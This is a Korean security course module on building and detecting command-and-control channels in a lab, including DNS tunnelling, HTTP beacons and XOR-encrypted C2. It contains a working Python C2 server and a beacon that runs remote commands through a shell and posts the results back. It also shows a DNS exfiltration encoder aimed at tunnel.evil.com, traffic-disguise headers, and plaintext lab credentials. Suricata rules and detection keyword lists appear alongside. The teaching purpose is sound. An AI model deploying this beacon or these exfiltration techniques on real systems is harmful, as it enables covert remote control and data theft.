# Week 03: C2 채널 구축 — DNS Tunneling, HTTP C2, 암호화 통신

## 학습 목표
- Command and Control(TA0011) 전술의 핵심 기법을 이해하고 실습한다
- DNS 터널링(dnscat2)을 구성하여 방화벽을 우회하는 은닉 C2 채널을 구축한다
- HTTP/HTTPS 기반 C2 채널의 구조와 비콘(Beacon) 통신 패턴을 분석한다
- 암호화된 C2 채널(TLS, 커스텀 프로토콜)의 구현과 탐지 방법을 익힌다
- Suricata/Wazuh를 활용하여 C2 트래픽을 탐지하고 차단하는 방어 전략을 수립한다
- OpsClaw를 통한 C2 시뮬레이션 자동화와 PoW 증거 기록을 수행한다

## 전제 조건
- Week 02 다단계 침투 실습 완료 (리버스 셸, Persistence 이해)
- TCP/IP 네트워크 기본 (DNS 프로토콜, HTTP 프로토콜 구조)
- Linux 네트워크 도구 사용 경험 (curl, dig, nc, tcpdump)
- OpsClaw 프로젝트 생성·실행 경험

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | C2 서버 역할 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 감염 호스트 (피해 서버) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh 4.11.2) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: C2 개론 + DNS 터널링 이론 | 강의 |
| 0:40-1:10 | Part 2: DNS 터널링 실습 (dnscat2 시뮬레이션) | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | Part 3: HTTP C2 채널 구축 실습 | 실습 |
| 2:00-2:40 | Part 4: 암호화 C2 + 탐지·방어 | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 종합: C2 탐지 헌팅 연습 + 토론 | 실습/토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **C2** | Command and Control | 공격자가 감염 시스템을 원격 제어하는 인프라 | 첩보원에게 지령을 보내는 채널 |
| **비콘** | Beacon | 감염 호스트가 C2 서버에 주기적으로 보내는 체크인 신호 | 정기 보고 전화 |
| **DNS 터널링** | DNS Tunneling | DNS 쿼리/응답에 데이터를 인코딩하여 전송 | 편지 봉투에 비밀 메시지 숨기기 |
| **dnscat2** | - | DNS 터널링 기반 C2 도구 | DNS를 이용한 비밀 전화기 |
| **Jitter** | 지터 | 비콘 간격에 무작위 변동을 추가하는 기법 | 불규칙한 보고 시간 |
| **Malleable C2** | 가변형 C2 | 트래픽을 정상 서비스로 위장하는 C2 프로파일 | 택배 상자로 위장한 밀수품 |
| **Domain Fronting** | 도메인 프론팅 | CDN을 이용하여 C2 도메인을 은닉하는 기법 | 합법 건물 뒤의 비밀 사무실 |
| **Dead Drop** | 데드 드롭 | 공개 서비스(SNS, 클라우드)를 중간 매체로 사용 | 공원 벤치 아래 비밀 쪽지 |
| **JA3** | - | TLS ClientHello 기반 핑거프린팅 기법 | 악수 방식으로 신분 확인 |

---

# Part 1: C2 개론 + DNS 터널링 이론 (40분)

## 1.1 C2 전술 개요

Command and Control(TA0011)은 공격자가 침투한 시스템과 **안정적이고 은밀한 통신 채널**을 유지하는 단계이다. 킬체인 6단계에 해당하며, 모든 후속 공격 행위(측면 이동, 데이터 유출)의 기반이 된다.

### ATT&CK C2 기법 매핑

| 기법 ID | 기법명 | 은닉 수준 | 대역폭 | 탐지 방법 |
|---------|--------|----------|--------|----------|
| T1071.001 | Web Protocols (HTTP/S) | 중간 | 높음 | 프록시 로그, SSL 인스펙션 |
| T1071.004 | DNS | 높음 | 낮음 | DNS 쿼리 이상 탐지 |
| T1572 | Protocol Tunneling | 높음 | 중간 | DPI(Deep Packet Inspection) |
| T1573.001 | Encrypted Channel: Symmetric | 높음 | 높음 | 엔트로피 분석 |
| T1573.002 | Encrypted Channel: Asymmetric | 높음 | 높음 | 인증서 분석 |
| T1090.002 | Proxy: External Proxy | 높음 | 높음 | 외부 프록시 접속 탐지 |
| T1102 | Web Service (Dead Drop) | 매우 높음 | 낮음 | 알려진 서비스 이상 사용 탐지 |
| T1008 | Fallback Channels | 높음 | 가변 | 다중 채널 패턴 분석 |

### C2 아키텍처 패턴

```
패턴 1: 직접 연결 (Direct)
+----------+         +----------+
| 감염 호스트 | ------> | C2 서버   |
+----------+  비콘    +----------+

패턴 2: 리다이렉터 (Redirector)
+----------+         +----------+         +----------+
| 감염 호스트 | ------> | 리다이렉터 | ------> | C2 서버   |
+----------+         +----------+         +----------+

패턴 3: P2P (Peer-to-Peer)
+----------+ ←----> +----------+
| 감염 호스트A|       | 감염 호스트B|
+----------+       +----------+
      ↕                  ↕
         +----------+
         | C2 서버   |
         +----------+

패턴 4: Dead Drop
+----------+   쓰기   +----------+   읽기   +----------+
| C2 서버   | ------> | GitHub등  | <------ | 감염 호스트 |
+----------+         +----------+         +----------+
```

## 1.2 DNS 터널링의 원리

DNS 터널링은 DNS 프로토콜의 쿼리와 응답에 **임의의 데이터를 인코딩**하여 전송하는 기법이다.

### DNS 터널링 동작 원리

```
정상 DNS:
  Client → DNS: "www.example.com의 IP?" → "93.184.216.34"

DNS 터널링:
  Client → DNS: "aGVsbG8gd29ybGQ.evil.com의 TXT?"
                  ^^^^^^^^^^^^^^^^^^
                  Base32 인코딩된 데이터 (서브도메인)

  DNS → Client: TXT "Y29tbWFuZF9yZXN1bHQ="
                      ^^^^^^^^^^^^^^^^^^^^
                      Base64 인코딩된 C2 응답
```

### DNS 터널링 탐지 지표

| 지표 | 정상 범위 | 터널링 의심 | 탐지 방법 |
|------|----------|-----------|----------|
| 서브도메인 길이 | 1-30자 | 50자 이상 | DNS 로그 분석 |
| 쿼리 빈도 | 도메인당 분당 1-10회 | 분당 100회 이상 | 통계 분석 |
| TXT 레코드 비율 | 전체의 1-5% | 20% 이상 | 쿼리 유형 통계 |
| 도메인 엔트로피 | 낮음 (~3.2) | 높음 (~4.8) | Shannon 엔트로피 |
| 응답 크기 | 일반적으로 작음 | 비정상적으로 큼 | 패킷 크기 분석 |
| 유니크 서브도메인 수 | 적음 | 매우 많음 | DNS 캐시 분석 |

### 실전 APT 그룹의 DNS C2 사례

| APT 그룹 | 도구/캠페인 | DNS C2 특징 |
|----------|-----------|-------------|
| APT29 | SUNBURST | avsvmcloud.com, DGA 기반 서브도메인 |
| APT34 | DNSpionage | dns-update.com, A 레코드 응답에 명령 인코딩 |
| Lazarus | BLINDINGCAN | DNS TXT 레코드로 명령 전달 |

## 1.3 HTTP C2 개론

HTTP/HTTPS 기반 C2는 **가장 보편적인** C2 채널이다. 웹 트래픽은 거의 모든 네트워크에서 허용되며, HTTPS 암호화로 페이로드를 은닉할 수 있다.

### C2 도구 비교

| 도구 | 유형 | C2 프로토콜 | Malleable | 비용 |
|------|------|-----------|----------|------|
| Cobalt Strike | 상용 | HTTP/S, DNS, SMB | 지원 | $3,500/yr |
| Sliver | 오픈소스 | HTTP/S, DNS, mTLS, WG | 일부 | 무료 |
| Havoc | 오픈소스 | HTTP/S | 지원 | 무료 |
| Mythic | 오픈소스 | HTTP, WebSocket | 에이전트별 | 무료 |

## 실습 1.1: OpsClaw 프로젝트 생성

> **실습 목적**: C2 채널 시뮬레이션을 위한 OpsClaw 프로젝트를 생성하고 환경을 점검한다.
>
> **배우는 것**: C2 시뮬레이션 프로젝트의 설계 방법과 공격/방어 서버의 역할 분담을 이해한다.
>
> **결과 해석**: 프로젝트가 정상 생성되고 executing 상태로 전환되면 준비 완료이다.
>
> **실전 활용**: C2 인프라 구축 전 네트워크 연결성 점검은 작전 성공의 전제 조건이다.

```bash
# API 키 설정
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# 환경 점검
curl -s http://localhost:8000/health | python3 -m json.tool
# 예상 출력: {"status": "ok"}

for host in 10.20.30.201 10.20.30.1 10.20.30.80 10.20.30.100; do
  echo "=== $host ===" && curl -s --connect-timeout 3 http://$host:8002/health 2>/dev/null || echo "UNREACHABLE"
done
```

> **명령어 해설**: `--connect-timeout 3`은 3초 내 연결 실패 시 타임아웃으로 처리한다.
>
> **트러블슈팅**: SubAgent가 응답하지 않으면 해당 서버에 SSH 접속 후 프로세스 상태를 확인한다.

```bash
# 프로젝트 생성
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week03-c2-channels",
    "request_text": "C2 채널 구축 시뮬레이션: DNS Tunneling, HTTP C2, 암호화 채널",
    "master_mode": "external"
  }' | python3 -m json.tool
```

```bash
export PROJECT_ID="반환된-프로젝트-ID"

curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

---

# Part 2: DNS 터널링 실습 (30분)

## 2.1 dnscat2 아키텍처

```
+-------------------+              +-------------------+
| dnscat2 서버       |              | dnscat2 클라이언트  |
| (10.20.30.201)    | <-- DNS -->  | (10.20.30.80)     |
| 53/UDP 리스닝      |   쿼리/응답   | 서브도메인 인코딩   |
| 명령 입력 → 응답   |              | 명령 수신 → 실행   |
+-------------------+              +-------------------+
```

## 실습 2.1: DNS 터널링 시뮬레이션

> **실습 목적**: DNS 쿼리를 이용한 데이터 전송 원리를 직접 구현한다. 기본 도구(dig, python)로 핵심 메커니즘을 체험한다.
>
> **배우는 것**: DNS 서브도메인에 데이터를 인코딩하는 방법, Base32 인코딩의 이유(DNS 레이블 제약), 쿼리 빈도와 길이가 탐지 지표가 되는 원리를 이해한다.
>
> **결과 해석**: Base32 인코딩된 서브도메인이 DNS 쿼리로 전송되면 성공이다. 정상 DNS 쿼리와의 차이(길이, 엔트로피)를 관찰한다.
>
> **실전 활용**: DNS 터널링은 거의 모든 네트워크에서 DNS(53/UDP)를 허용하므로 방화벽 우회에 효과적이다.

```bash
# DNS 터널링 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[DNS TUNNEL SIM] 데이터 인코딩\" && DATA=\"hostname=$(hostname);user=$(whoami);ip=$(hostname -I | awk '\\''{ print $1 }'\\'')\" && echo \"원본: $DATA\" && ENCODED=$(echo -n \"$DATA\" | base32 | tr -d = | tr [:upper:] [:lower:]) && echo \"Base32: $ENCODED\" && echo \"DNS 쿼리 형태: ${ENCODED:0:63}.tunnel.evil.com\" && echo \"정상 DNS 길이: 14 (www.google.com)\" && echo \"터널 DNS 길이: $(echo -n $ENCODED | wc -c)\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DNS TUNNEL SIM] 다중 비콘 쿼리 패턴\" && for i in 1 2 3 4 5; do PAYLOAD=\"seq=${i};ts=$(date +%s);cmd=beacon\" && ENC=$(echo -n \"$PAYLOAD\" | base32 | tr -d = | tr [:upper:] [:lower:]) && echo \"Query $i: ${ENC:0:50}.c2.example.com (TXT)\"; done && echo && echo \"엔트로피 비교:\" && echo \"  정상 도메인: ~3.2 (영단어 기반)\" && echo \"  터널링 도메인: ~4.8 (랜덤 문자열)\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[DNS BASELINE] 정상 DNS 트래픽\" && cat /etc/resolv.conf 2>/dev/null && echo && dig +short google.com A 2>/dev/null && echo \"TXT:\" && dig +short google.com TXT 2>/dev/null | head -3",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `base32`: DNS 레이블은 영숫자와 하이픈만 허용하므로 Base64 대신 Base32를 사용한다
> - `tr -d =`: Base32 패딩 문자를 제거하여 유효한 DNS 레이블을 만든다
> - `${ENCODED:0:63}`: DNS 레이블 최대 63자 제한에 맞게 분할한다
>
> **트러블슈팅**: `base32` 명령이 없으면 `apt install coreutils`로 설치한다.

## 실습 2.2: DNS 터널링 탐지

> **실습 목적**: Suricata와 네트워크 도구로 DNS 터널링 트래픽을 탐지한다.
>
> **배우는 것**: Suricata DNS 탐지 규칙 구조, DNS 쿼리 로그 분석, 통계적 이상 탐지를 이해한다.
>
> **결과 해석**: DNS 터널링 관련 시그니처가 있으면 자동 탐지가 가능하다. 없으면 커스텀 규칙이 필요하다.
>
> **실전 활용**: SOC에서 DNS 로그 분석은 C2 탐지의 핵심이다.

```bash
# DNS 터널링 탐지
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[DETECT] Suricata DNS 규칙 확인\" && sudo grep -ri dns /etc/suricata/rules/ 2>/dev/null | grep -i '\\''tunnel\\|long\\|exfil'\\'' | head -10 || echo \"DNS 터널링 규칙 미발견\" && echo && echo \"=== 커스텀 규칙 예시 ===\" && echo '\\''alert dns any any -> any any (msg:\"DNS Tunnel - Long subdomain\"; dns.query; pcre:\"/^[a-z0-9]{50,}\\\\./\"; sid:1000001;)'\\'' && echo '\\''alert dns any any -> any any (msg:\"DNS Tunnel - High TXT ratio\"; dns.query; content:\"TXT\"; threshold:type both, track by_src, count 50, seconds 60; sid:1000002;)'\\''",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DETECT] DNS 로그 분석\" && sudo tail -30 /var/log/suricata/dns.log 2>/dev/null | head -15 || echo \"DNS 로그 없음\" && echo && sudo grep -i dns /var/log/suricata/fast.log 2>/dev/null | tail -5 || echo \"DNS 경보 없음\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `pcre:"/^[a-z0-9]{50,}\\./"`: 50자 이상의 서브도메인을 정규식으로 탐지한다
> - `threshold:type both, track by_src, count 50, seconds 60`: 출발지 IP별로 60초간 50회 이상 쿼리 시 경보를 발생한다
>
> **트러블슈팅**: DNS 로그가 비어 있으면 Suricata `eve-log` 설정에서 dns 출력이 활성화되어 있는지 확인한다.

---

# Part 3: HTTP C2 채널 구축 (40분)

## 3.1 HTTP C2 통신 패턴

| 패턴 | 설명 | 은닉 수준 | 탐지 방법 |
|------|------|----------|----------|
| 주기적 비콘 | 고정 간격 GET 요청 | 낮음 | 규칙적 패턴 탐지 |
| Jitter 비콘 | 랜덤 간격 GET 요청 | 중간 | 통계적 분석 |
| Long Polling | 명령 있을 때까지 연결 유지 | 중간 | 긴 세션 탐지 |
| Malleable C2 | 정상 웹 트래픽 위장 | 높음 | 행위 기반 분석 |

### HTTP C2 비콘 흐름

```
감염 호스트                              C2 서버
    |  1. GET /api/beacon?id=abc123      |
    |----------------------------------->|
    |  200 OK {"cmd": "whoami"}          |
    |<-----------------------------------|
    |                                    |
    |  2. POST /api/report               |
    |  {"id":"abc123","result":"www-data"}|
    |----------------------------------->|
    |  200 OK {"cmd": "sleep 300"}       |
    |<-----------------------------------|
    |  (300초 대기 후 반복)                |
```

## 실습 3.1: HTTP C2 서버/클라이언트 시뮬레이션

> **실습 목적**: Python으로 간단한 HTTP C2 서버와 클라이언트(비콘)를 생성하여 비콘 통신 전체 구조를 이해한다.
>
> **배우는 것**: HTTP 비콘의 요청/응답 구조, User-Agent 위장, sleep/jitter의 역할, Base64 인코딩을 이해한다.
>
> **결과 해석**: C2 서버 코드와 비콘 코드가 정상 생성되면 성공이다. 코드를 분석하여 비콘 통신의 각 단계를 파악한다.
>
> **실전 활용**: Cobalt Strike, Sliver 등 실전 C2 도구의 핵심 동작 원리를 이해하면 탐지 규칙 작성에 직접 활용할 수 있다.

```bash
# HTTP C2 서버 + 비콘 코드 생성
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[HTTP C2] 서버 코드 생성\" && cat > /tmp/sim_c2_server.py << '\''PYEOF'\''\nimport http.server, json, base64\nclass C2Handler(http.server.BaseHTTPRequestHandler):\n    commands = [\"whoami\", \"id\", \"hostname\", \"sleep 60\"]\n    idx = 0\n    def do_GET(self):\n        if \"/api/beacon\" in self.path:\n            cmd = self.commands[self.idx % len(self.commands)]\n            self.__class__.idx += 1\n            self.send_response(200)\n            self.send_header(\"Content-Type\",\"application/json\")\n            self.end_headers()\n            self.wfile.write(json.dumps({\"task\":base64.b64encode(cmd.encode()).decode()}).encode())\n        else:\n            self.send_response(404); self.end_headers()\n    def do_POST(self):\n        body = self.rfile.read(int(self.headers.get(\"Content-Length\",0)))\n        print(f\"[C2] 결과: {body.decode()[:200]}\")\n        self.send_response(200); self.end_headers()\nprint(\"[SIM] C2 서버 코드 생성 완료\")\nPYEOF\necho \"[OK]\" && wc -l /tmp/sim_c2_server.py",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[HTTP C2] 비콘 코드 생성\" && cat > /tmp/sim_c2_beacon.py << '\''PYEOF'\''\nimport requests, base64, time, random, subprocess, json\nC2 = \"http://10.20.30.201:8080\"\nSLEEP, JITTER = 30, 0.3\nAGENT = \"beacon-web-001\"\nUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\ndef beacon():\n    try:\n        r = requests.get(f\"{C2}/api/beacon?id={AGENT}\", headers={\"User-Agent\":UA}, timeout=10)\n        cmd = base64.b64decode(r.json()[\"task\"]).decode()\n        if cmd.startswith(\"sleep\"): return\n        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)\n        requests.post(f\"{C2}/api/report\", json={\"id\":AGENT,\"output\":out.stdout.decode()[:1000]}, headers={\"User-Agent\":UA}, timeout=10)\n    except: pass\nprint(f\"[SIM] 비콘 코드 생성 완료 (간격: {SLEEP}s, 지터: {JITTER*100}%)\")\nprint(f\"실제 간격: {SLEEP*(1-JITTER):.0f}~{SLEEP*(1+JITTER):.0f}초\")\nPYEOF\necho \"[OK]\" && wc -l /tmp/sim_c2_beacon.py",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `User-Agent` 위장: Chrome의 UA를 사용하여 프록시 로그에서 의심을 피한다
> - `JITTER = 0.3`: 비콘 간격을 21~39초 범위에서 랜덤 변동시켜 규칙적 패턴 탐지를 어렵게 한다
> - `base64` 인코딩: 명령/결과를 인코딩하여 프록시 로그에 평문이 노출되지 않게 한다
>
> **트러블슈팅**: `requests` 모듈이 없으면 `pip install requests`로 설치한다.

## 실습 3.2: 비콘 통신 특성 분석

> **실습 목적**: 실제 비콘 통신을 시뮬레이션하고 네트워크 특성을 관찰한다.
>
> **배우는 것**: 비콘 HTTP 요청의 구조, 정상 웹 트래픽과의 차이점, URL/User-Agent 패턴 분석을 이해한다.
>
> **결과 해석**: 동일 엔드포인트에 주기적 요청이 전송되면 C2 비콘 패턴이다. URL 구조, 요청 빈도, 응답 크기의 균일성이 탐지 지표이다.
>
> **실전 활용**: 프록시 로그에서 C2 비콘을 탐지하는 것은 SOC 분석가의 핵심 역량이다.

```bash
# 비콘 통신 시뮬레이션 (curl)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "echo \"[BEACON SIM] 비콘 3회 시뮬레이션\" && for i in 1 2 3; do echo \"--- Beacon #$i ($(date +%H:%M:%S)) ---\" && curl -s -o /dev/null -w \"HTTP %{http_code}, Size: %{size_download}B, Time: %{time_total}s\" -H \"User-Agent: Mozilla/5.0\" http://10.20.30.201:8000/health 2>/dev/null && echo && sleep $((RANDOM % 3 + 1)); done && echo \"[OK] 비콘 시뮬레이션 완료\" && echo && echo \"=== 탐지 가능 패턴 ===\" && echo \"1. 동일 URL에 반복 접속\" && echo \"2. 규칙적 시간 간격\" && echo \"3. 야간/주말에도 지속\"",
    "subagent_url": "http://10.20.30.80:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `curl -w "HTTP %{http_code}"`: 응답 코드, 크기, 소요 시간을 출력한다
> - `RANDOM % 3 + 1`: 1~3초 랜덤 지터를 생성한다
>
> **트러블슈팅**: health 엔드포인트 대신 별도 HTTP 서버에 비콘을 보내려면 `python3 -m http.server 8080`을 사용한다.

## 실습 3.3: Malleable C2 위장 분석

> **실습 목적**: C2 트래픽을 정상 웹 서비스로 위장하는 Malleable C2의 원리를 분석한다.
>
> **배우는 것**: Cobalt Strike Malleable C2 프로파일의 구조, URL/헤더/바디 변환 기법, CDN 기반 Domain Fronting의 원리를 이해한다.
>
> **결과 해석**: 위장된 C2 트래픽은 정상 웹 요청과 외형적으로 구분이 어렵다. 행위 기반 분석(비콘 타이밍, 세션 패턴)이 유일한 탐지 수단이 될 수 있다.
>
> **실전 활용**: Malleable C2 프로파일 이해는 Blue Team이 고급 C2를 탐지하기 위한 필수 지식이다.

```bash
# Malleable C2 프로파일 분석
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "echo \"[MALLEABLE C2] 프로파일 예시\" && echo && echo \"=== 위장 전 (기본 Cobalt Strike) ===\" && echo \"GET /beacon HTTP/1.1\" && echo \"Cookie: session=aGVsbG8=\" && echo && echo \"=== 위장 후 (Amazon CDN 위장) ===\" && echo \"GET /s/ref=nb_sb_noss?field-keywords=cloud+security HTTP/1.1\" && echo \"Host: www.amazon.com\" && echo \"Accept: text/html\" && echo \"Cookie: skin=noskin;session-token=aGVsbG8=\" && echo && echo \"=== Domain Fronting 원리 ===\" && echo \"TLS SNI: cdn.cloudfront.net (합법)\" && echo \"HTTP Host: evil-c2.cloudfront.net (실제 목적지)\" && echo \"→ 네트워크 장비는 SNI만 보고 허용, CDN이 Host 헤더로 라우팅\" && echo && echo \"=== 탐지 방법 ===\" && echo \"1. SNI와 Host 헤더 불일치 탐지\" && echo \"2. JA3 핑거프린팅으로 C2 도구 식별\" && echo \"3. 비콘 타이밍 패턴 통계 분석\" && echo \"4. User-Agent 일관성 검사 (항상 동일 UA)\"",
    "subagent_url": "http://10.20.30.201:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `session-token=aGVsbG8=`: C2 데이터를 정상 쿠키 값으로 위장한다
> - `field-keywords=cloud+security`: URL 파라미터를 Amazon 검색 쿼리로 위장한다
> - Domain Fronting: TLS의 SNI 필드와 HTTP의 Host 헤더가 다른 도메인을 가리키는 기법이다
>
> **트러블슈팅**: Domain Fronting은 주요 CDN(AWS, Google, Azure)에서 점차 차단되고 있다. 최신 상태를 확인해야 한다.

---

# Part 4: 암호화 C2 + 탐지·방어 (40분)

## 4.1 암호화된 C2 채널

| 방식 | ATT&CK | 강도 | 탐지 방법 |
|------|--------|------|----------|
| TLS/SSL (HTTPS) | T1573.002 | 높음 | 인증서 분석, JA3 |
| 커스텀 대칭키 (XOR/AES) | T1573.001 | 중간~높음 | 엔트로피 분석 |
| mTLS | T1573.002 | 매우 높음 | 인증서 체인 분석 |
| SSH 터널 | T1572 | 높음 | SSH 세션 이상 분석 |

### JA3 핑거프린팅

```
JA3 = MD5(TLS ClientHello 파라미터)

정상 Chrome:     769,47-53-5-10-49171-49172-...,0-23-65281-...,29-23-24,0
Cobalt Strike:   769,49196-49195-49200-49199-...,0-10-11-13-...,29-23-24,0
→ JA3 해시로 알려진 C2 도구를 식별할 수 있다
```

## 실습 4.1: 암호화 C2 시뮬레이션

> **실습 목적**: 자체 암호화된 C2 통신을 시뮬레이션하고 암호화 트래픽의 특성을 분석한다.
>
> **배우는 것**: XOR 인코딩 원리, 암호화 트래픽의 엔트로피 특성, JA3 핑거프린팅 개념을 이해한다.
>
> **결과 해석**: 암호화된 데이터의 바이트 분포가 균일하면(엔트로피 ~7.9) 강한 암호화이다. 정상 텍스트(~4.5)와 차이가 있어 엔트로피 자체가 탐지 지표가 된다.
>
> **실전 활용**: SSL 인스펙션이 불가능한 환경에서 JA3는 C2 식별의 유일한 수단일 수 있다.

```bash
# 암호화 C2 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[ENCRYPTED C2] XOR 인코딩 시뮬레이션\" && python3 << '\''PYEOF'\''\nimport os, base64\ndef xor_enc(data, key):\n    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))\nplain = b\"whoami; id; cat /etc/passwd | head -5\"\nkey = os.urandom(16)\nenc = xor_enc(plain, key)\nprint(f\"평문: {plain.decode()}\")\nprint(f\"키(hex): {key.hex()}\")\nprint(f\"암호문(b64): {base64.b64encode(enc).decode()}\")\ndec = xor_enc(enc, key)\nprint(f\"복호화: {dec.decode()}\")\nprint(f\"\\n바이트 범위 - 평문: {min(plain)}-{max(plain)}, 암호문: {min(enc)}-{max(enc)}\")\nPYEOF",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DETECT] C2 암호화 탐지 기법\" && echo \"1. JA3 핑거프린팅:\" && echo \"   alert tls any any -> any any (msg:\\\"Known C2 JA3\\\"; ja3.hash; content:\\\"e7d705a3286e19ea42f587b344ee6865\\\"; sid:2000001;)\" && echo \"2. 엔트로피 기반: 높은 엔트로피(>7.5) + 비표준 포트 = 의심\" && echo \"3. 인증서 분석: 자체 서명, 짧은 유효기간, 의심 발급자\" && echo \"4. 타이밍 분석: 암호화되어도 통신 간격 패턴은 노출\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `os.urandom(16)`: 128비트 암호학적 랜덤 키를 생성한다
> - XOR 암호화: 가장 단순한 대칭 암호로, 같은 키로 암호화/복호화가 가능하다
> - `ja3.hash`: Suricata에서 TLS ClientHello의 JA3 해시를 매칭하는 키워드이다
>
> **트러블슈팅**: `os.urandom`은 `/dev/urandom`을 사용한다. 가상 환경에서 엔트로피 부족 시 `haveged`를 설치한다.

## 실습 4.2: C2 방어 종합 점검

> **실습 목적**: 현재 환경의 C2 방어 태세를 종합 점검한다. 방화벽, IPS, DNS 정책을 확인한다.
>
> **배우는 것**: 아웃바운드 방화벽 정책, Suricata C2 탐지 규칙, DNS 싱크홀 전략을 이해한다.
>
> **결과 해석**: 아웃바운드 정책이 허용(ACCEPT)이면 C2 통신이 쉽게 이루어진다. 화이트리스트 기반 아웃바운드 정책이 이상적이다.
>
> **실전 활용**: 엔터프라이즈 환경에서 아웃바운드 트래픽 제한은 C2 차단의 가장 효과적인 방법이다.

```bash
# C2 방어 종합 점검
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[DEFENSE] 방화벽 아웃바운드 규칙\" && sudo nft list ruleset 2>/dev/null | grep -A5 '\\''output\\|forward'\\'' | head -20 || echo \"nftables 접근 불가\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DEFENSE] Suricata C2 경보\" && sudo tail -30 /var/log/suricata/fast.log 2>/dev/null | grep -iE '\\''c2\\|beacon\\|tunnel\\|cobalt'\\'' | tail -5 || echo \"C2 경보 없음\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[DEFENSE] DNS 차단 전략\" && echo \"1. DNS 싱크홀: C2 도메인 → 127.0.0.1\" && echo \"2. 내부 DNS만 허용 (53/UDP 외부 차단)\" && echo \"3. 전체 DNS 쿼리 SIEM 전달\" && echo \"4. Threat Intel 피드 적용\" && cat /etc/resolv.conf",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `nft list ruleset`: nftables의 전체 방화벽 규칙을 출력한다
> - `grep -iE 'c2|beacon|tunnel'`: C2 관련 키워드로 Suricata 경보를 필터링한다
>
> **트러블슈팅**: `nft` 명령에 sudo가 필요하다. SubAgent에 sudo 권한이 있는지 확인한다.

## 4.3 결과 확인 및 완료 보고서

```bash
# 결과 확인
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
